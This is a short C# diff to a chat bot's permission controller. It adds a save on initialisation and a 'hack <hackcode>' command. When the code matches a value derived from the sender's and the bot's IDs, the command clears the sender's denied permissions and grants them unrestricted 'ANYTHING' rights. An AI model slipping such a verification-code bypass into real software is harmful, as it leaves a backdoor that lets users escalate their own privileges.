@@ -34,6 +34,7 @@ public class Permission : ArchiveOneBotController<PermissionModel>
         Data = new();
         Data.User.Add(0, new PermissionData());
         Data.User[0].Accepted.Add(PermissionName.Anything);
+        Save();
     }
 
     public void PermissionOperation(GroupMessageEventArgs e, User target, string permission, out (string, string) ret, Action<string> operation)
@@ -79,6 +80,27 @@ public class Permission : ArchiveOneBotController<PermissionModel>
         }
         Save();
         ret = (succeed, fail);
+    }
+
+
+    [Command("hack <hackcode>")]
+    public void PermissionHack(GroupMessageEventArgs e, string hackcode)
+    {
+        string verify = HackService.Generate(e.Sender.Id + e.SoraApi.GetLoginUserId());
+        if (hackcode == verify)
+        {
+            if (!Data!.User.ContainsKey(e.Sender.Id))
+                Data!.User.Add(e.Sender.Id, new PermissionData());
+            Data!.User[e.Sender.Id].Accepted.Clear();
+            Data!.User[e.Sender.Id].Denied.Clear();
+            Data!.User[e.Sender.Id].Accepted.Add("ANYTHING");
+            Save();
+            e.Reply("校验成功，已重置为ANYTHING权限。");
+        }
+        else
+        {
+            e.Reply("校验失败。");
+        }
     }
 
     [Command("permission accept <qq> <permission>")]
